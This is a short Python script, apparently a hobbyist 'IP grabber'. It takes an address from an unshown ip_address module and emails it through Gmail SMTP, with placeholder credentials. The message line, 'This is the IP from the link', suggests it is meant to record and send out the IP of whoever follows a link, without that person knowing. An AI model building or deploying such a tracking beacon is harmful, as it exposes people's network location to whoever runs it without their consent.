import smtplib, ssl
import ip_address as ip

# A Basic IP Grabber that Emails the IP to an email address. 
# Must use an App Password for Dev instead of your own password req. 2FA auth


address = ip.get()

port = 465  # For SSL
smtp_server = "smtp.gmail.com" # Mail server
sender_email = "someone@gmail.com"  # Enter your address
receiver_email = "someone@gmail.com"  # Enter receiver address
password = "App Password from Google" # Enter your Google App Password
message = "This is the IP from the link: " + address

context = ssl.create_default_context() 
with smtplib.SMTP_SSL(smtp_server, port, context=context) as server: # creates the email server connection
    server.login(sender_email, password) # logs in
    server.sendmail(sender_email, receiver_email, message) # Sends the email